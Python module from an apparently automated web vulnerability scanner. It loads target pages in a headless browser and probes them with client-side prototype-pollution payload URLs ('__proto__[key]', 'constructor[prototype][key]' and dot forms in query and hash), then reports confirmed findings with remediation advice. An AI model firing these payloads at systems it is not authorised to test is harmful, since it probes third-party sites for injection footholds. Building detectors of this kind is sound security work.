"""Stage 5: client-side prototype pollution, proven in a real browser.

Server-side prototype pollution is easy to test with JSON bodies. The
client-side variant lives in query/hash parsers and deep-merge helpers
(jQuery.extend, lodash.merge, bespoke recursion) — nothing on the wire
proves it, so this module loads the page headless and reads the prototype
back out of the JavaScript realm.

The marker key is random per run, so the check cannot be satisfied by a
page that already carries the property. A reflection or an error page is
not pollution: only `({})[key] === value` inside the browser counts.
Finding a polluted prototype is not yet DOM XSS — the finding says so and
leaves severity at MEDIUM until a gadget is demonstrated.
"""

import secrets
from urllib.parse import quote, urlparse

from modules.base import BaseModule


def payload_urls(url: str, key: str, value: str) -> list:
    """Source shapes for query-string and hash parsers.

    `__proto__` and `constructor[prototype]` are the two ways a merge
    helper reaches Object.prototype; the dot form covers parsers that do
    not support brackets.
    """
    base = url.split("#", 1)[0]
    query = "&" if urlparse(base).query else "?"
    encoded = quote(value, safe="")
    return [
        ("query.__proto__[key]",
         f"{base}{query}__proto__[{key}]={encoded}"),
        ("query.constructor[prototype][key]",
         f"{base}{query}constructor[prototype][{key}]={encoded}"),
        ("query.__proto__.key",
         f"{base}{query}__proto__.{key}={encoded}"),
        ("hash.__proto__[key]", f"{base}#__proto__[{key}]={encoded}"),
        ("hash.__proto__.key", f"{base}#__proto__.{key}={encoded}"),
    ]


class ClientProtoPollution(BaseModule):
    id = "client_proto_pollution"
    name = "Client-Side Prototype Pollution"
    stage = 5
    detectability = "medium"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            self.state.skip_module(self.id, "playwright not installed")
            return "skipped"

        pages = self._pages(int(cfg.get("max_pages", 0) or 0))
        if not pages:
            self.state.skip_module(self.id, "no pages to test")
            return "skipped"

        key = f"pp{secrets.token_hex(3)}"
        value = "polluted"
        try:
            timeout = int(cfg.get("timeout_ms", 15000) or 15000)
            settle = int(cfg.get("wait_ms", 800) or 800)
        except (TypeError, ValueError):
            timeout, settle = 15000, 800

        reported = 0
        try:
            playwright = await async_playwright().start()
        except Exception as exc:
            self.state.skip_module(self.id, f"playwright unavailable: {exc}")
            return "skipped"
        browser = None
        try:
            try:
                browser = await playwright.chromium.launch(headless=True)
            except Exception as exc:
                self.state.skip_module(
                    self.id, f"browser unavailable: {exc}")
                return "skipped"
            context = await browser.new_context()
            for page_url in pages:
                if self.should_stop(reserve=20):
                    break
                page = await context.new_page()
                try:
                    if await self._load(page, page_url, timeout, settle):
                        already = await self._polluted(page, key, value)
                        for label, candidate in payload_urls(
                                page_url, key, value):
                            if already or self.should_stop(reserve=10):
                                break
                            if not await self._load(page, candidate,
                                                    timeout, settle):
                                continue
                            if await self._polluted(page, key, value):
                                self._file(page_url, label, candidate,
                                           key, value)
                                reported += 1
                                break
                finally:
                    await page.close()
        finally:
            if browser is not None:
                await browser.close()
            await playwright.stop()

        self.state.complete_module(self.id)
        self.log(f"  prototype pollution findings: {reported}")
        return "done"

    async def _load(self, page, url: str, timeout: int, settle: int) -> bool:
        try:
            await page.goto(url, wait_until="domcontentloaded",
                            timeout=timeout)
            await page.wait_for_timeout(settle)
            return True
        except Exception:
            return False

    @staticmethod
    async def _polluted(page, key: str, value: str) -> bool:
        """Read the property back out of a fresh object in the page realm."""
        try:
            result = await page.evaluate(
                "(k) => { try { return ({} )[k]; } catch (e) { return null; } }",
                key)
        except Exception:
            return False
        return result == value

    def _pages(self, limit: int) -> list:
        pages = [self.base_url]
        seen = {self.base_url.rstrip("/")}
        for asset_type in ("webapp", "url"):
            for asset in self.state.get_assets_by_type(asset_type):
                url = str(asset.get("value", "") or "")
                if not url.startswith(("http://", "https://")):
                    continue
                if url.rstrip("/") in seen:
                    continue
                seen.add(url.rstrip("/"))
                pages.append(url)
        return pages if limit <= 0 else pages[:limit]

    def _file(self, page_url: str, label: str, candidate: str,
              key: str, value: str) -> None:
        self.state.add_finding(
            title=(f"Client-side prototype pollution ({label}) on "
                   f"{page_url}"),
            severity="MEDIUM",
            confidence="CONFIRMED",
            category="Client-Side Prototype Pollution",
            description=(
                f"Loading {candidate} in a headless browser set "
                f"Object.prototype.{key} to `{value}`: the page merges "
                "attacker-controlled URL input into a plain object without "
                "rejecting `__proto__`/`constructor.prototype`. Any client "
                "gadget that reads that property can now be driven (DOM XSS, "
                "script-src override, option injection); no gadget was "
                "executed during this test, so this is the pollution "
                "primitive, not a demonstrated XSS."),
            evidence=[
                f"Page: {page_url}",
                f"Source shape: {label}",
                f"Payload URL: {candidate}",
                f"Browser check: ({{}})['{key}'] === {value!r}",
            ],
            remediation=(
                "Reject `__proto__`, `constructor`, and `prototype` keys in "
                "any user-controlled merge (or use Object.create(null)/Map "
                "for parsed input), freeze Object.prototype, and replace "
                "deep-merge helpers with schema-validated assignments."),
            asset_keys=[f"url:{page_url}"],
            verified=True,
            verification={
                "method": "browser_prototype_pollution",
                "source": label,
                "polluted_key": key,
                "payload_url": candidate,
            },
        )

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}
